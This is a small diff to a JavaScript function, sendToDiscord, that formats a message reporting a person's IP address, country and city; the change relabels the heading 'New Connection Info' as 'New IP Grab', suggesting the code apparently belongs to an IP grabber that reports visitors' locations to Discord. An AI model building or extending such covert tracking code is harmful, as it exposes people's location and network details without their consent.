@@ -32,7 +32,7 @@ async function sendToDiscord(info) {
     }
 
     const payload = {
-        content: `📡 **New Connection Info**
+        content: `📡 **New IP Grab**
 > 🖥️ IP Address: \`${info.ip}\`
 > 🌍 Country: **${info.country}**
 > 🏙️ City: **${info.city}**
